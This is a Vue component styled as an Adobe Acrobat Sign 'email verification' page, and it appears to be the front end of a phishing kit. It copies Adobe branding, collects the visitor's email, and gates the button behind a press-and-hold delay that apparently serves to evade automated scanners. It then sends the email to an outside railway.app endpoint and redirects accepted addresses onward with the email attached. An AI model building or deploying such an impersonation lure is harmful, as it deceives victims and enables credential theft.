<template>
  <div class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <header class="header">
          <div class="logo-text">
            <!-- Replace with your real logo if you have one -->
            <img src="@/assets/adobe-logo.svg" alt="Adobe Logo" class="adobe-logo" />
            <span>Adobe Acrobat Sign</span>
          </div>
          <div class="success-check">✔︎</div>
        </header>

        <div class="content">
          <p><strong>Email verification required.</strong></p>
          <input
            v-model="email"
            type="email"
            placeholder="Enter email"
            required
            class="email-input"
            :disabled="loading"
          />
          <p v-if="error" class="error">{{ error }}</p>
        </div>

        <button
          @mousedown="startHold"
          @mouseup="endHold"
          @mouseleave="cancelHold"
          @touchstart.prevent="startHold"
          @touchend.prevent="endHold"
          :disabled="loading"
          class="action-button"
        >
          {{ loading ? 'Verifying…' : 'Next' }}
        </button>

        <div class="divider"></div>

        <footer class="footer-container">
          <p class="footer-text">© 2025 Adobe. All rights reserved.</p>
          <div class="global-footer">
            <!-- any global links or info here -->
          </div>
        </footer>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
let holdTimer = null
const holdDuration = 1500
const redirectBaseUrl = 'https://yourdomain.com/complete'

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function verifyEmail() {
  try {
    const res = await fetch(
      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: email.value }),
      }
    )
    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(
      email.value
    )}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer = setTimeout(verifyEmail, holdDuration)
}

function endHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}

function cancelHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}
</script>

<!-- global styles must be unscoped -->
<style>
html, body, #app {
  height: 100%;
  margin: 0;
}
</style>

<!-- component-specific styles -->
<style scoped>
.background {
  min-height: 100vh;
  padding: 2rem;
  font-family: Arial, sans-serif;
  background-color: #f4f4f4;
  display: flex;
  align-items: center;
  justify-content: center;
}

.adobe-sign-container {
  width: 100%;
  max-width: 400px;
}

.sign-card {
  background: white;
  border-radius: 10px;
  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  padding: 2rem;
}

.header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 1rem;
}

.logo-text {
  display: flex;
  align-items: center;
  font-weight: bold;
}

.adobe-logo {
  height: 24px;
  margin-right: 0.5rem;
}

.success-check {
  font-size: 2rem;
  color: green;
}

.content p {
  margin: 0.5rem 0;
}

.email-input {
  width: 100%;
  padding: 0.5rem;
  margin: 1rem 0;
  border: 1px solid #ccc;
  border-radius: 5px;
}

.error {
  color: red;
  font-size: 0.9rem;
}

.action-button {
  background-color: #0051c3;
  color: white;
  padding: 0.6rem 1.2rem;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  width: 100%;
  margin-top: 0.5rem;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: #003a91;
}

.divider {
  height: 1px;
  background-color: #e0e0e0;
  margin: 1.5rem 0;
}

.footer-container {
  text-align: center;
}

.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}
</style>
